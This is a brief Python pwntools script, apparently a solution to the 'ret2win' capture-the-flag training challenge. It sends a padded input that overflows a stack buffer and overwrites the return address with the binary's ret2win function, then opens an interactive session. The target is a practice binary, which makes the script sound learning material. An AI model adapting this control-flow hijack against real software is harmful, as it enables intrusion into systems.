#!/usr/bin/env python3

# Title:        XXX.py
# Description:  X
# Author:       bluecosmo

from pwn import *

elf = context.binary = ELF("./ret2win")
p = process(elf.path)

payload = b"A" * 0x28 # buffer + rbp
payload += p64(elf.symbols["ret2win"])

p.sendline(payload)
p.interactive()
